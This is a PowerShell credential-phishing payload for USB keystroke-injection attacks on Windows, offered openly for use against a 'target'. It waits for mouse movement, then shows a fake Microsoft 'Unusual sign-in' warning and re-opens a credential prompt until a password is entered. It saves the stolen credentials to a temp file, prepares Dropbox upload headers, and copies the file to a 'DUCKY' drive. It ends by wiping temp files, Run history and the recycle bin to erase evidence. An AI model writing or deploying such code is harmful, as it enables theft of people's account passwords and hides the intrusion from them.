############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : Credz-Plz         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Credentials       | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#                                                                                                            #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################

<#
.SYNOPSIS
	This script is meant to trick your target into sharing their credentials through a fake authentication pop up message

.DESCRIPTION 
	A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
	This will be followed by a fake authentication ui prompt. 
	If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
	Once the target enters their credentials their information will be uploaded to your dropbox for collection

.Link
	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads

#>

#------------------------------------------------------------------------------------------------------------------------------------

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to generate the ui.prompt you will use to harvest their credentials
#>

function Get-Creds {
    $validCreds = $false
    do {
        # Prompt for credentials
        $cred = $host.ui.promptforcredential('Failed Authentication', '', [Environment]::UserDomainName+'\'+[Environment]::UserName, [Environment]::UserDomainName)

        # Check if the credentials are null or empty
        if ($null -eq $cred) {
            [System.Windows.Forms.MessageBox]::Show("No credentials entered, retrying.")
            continue  # Skip the current iteration and prompt again
        }

        # Get the password and check if it is empty
        $password = $cred.GetNetworkCredential().Password
        if ([string]::IsNullOrWhiteSpace($password)) {
            [System.Windows.Forms.MessageBox]::Show("Credentials cannot be empty!")
            continue  # Prompt again if the password is empty
        }

        # If credentials are valid, break out of the loop
        $validCreds = $true
    } until ($validCreds)

    # Return the credentials in the desired format
    $creds = $cred.GetNetworkCredential() | Format-List
    return $creds
}




#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to pause the script until a mouse movement is detected
#>

# Function to pause the script until mouse movement is detected
function Pause_Script {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell

    while ($true) {
        $pauseTime = 3
        # Check if the cursor has moved
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
            break
        }
        else {
            # Simulate pressing the CapsLock key repeatedly
            $o.SendKeys("{CAPSLOCK}")
            Start-Sleep -Seconds $pauseTime
        }
    }
}


#----------------------------------------------------------------------------------------------------

# Function to turn CapsLock off if it is on
function Caps_Off {
    Add-Type -AssemblyName System.Windows.Forms
    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

    # If CapsLock is on, toggle it to turn it off
    if ($caps -eq $true) {
        $key = New-Object -ComObject WScript.Shell
        $key.SendKeys('{CapsLock}')
    }
}


#----------------------------------------------------------------------------------------------------

# Example usage of the functions
Pause_Script   # Call Pause_Script
Caps_Off       # Call Caps_Off

#----------------------------------------------------------------------------------------------------


Pause_Script

Caps_Off

Add-Type -AssemblyName System.Windows.Forms

[System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please authenticate your Microsoft Account")

$creds = Get-Creds

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to save the gathered credentials to a file in the temp directory
#>

Write-Output $creds >> $env:TMP\$FileName

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to upload your files to dropbox
#>

$TargetFilePath="/$FileName"
$SourceFilePath="$env:TMP\$FileName"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')


# Function to find the drive named "DUCKY"
function Get-DuckyDrive {
    $allDrives = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 -or $_.DriveType -eq 3 }  # 2 = Removable, 3 = Fixed
    foreach ($drive in $allDrives) {
        if ($drive.VolumeName -eq "DUCKY") {
            return $drive.DeviceID
        }
    }
    return $null  # Return null if no drive named "DUCKY" is found
}

# Search for the "DUCKY" drive
$duckyDrive = Get-DuckyDrive
if ($duckyDrive) {
    $TargetFilePath = "$duckyDrive\$FileName"
    Copy-Item -Path $SourceFilePath -Destination $TargetFilePath
} 


<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

Remove-Item $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

#Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue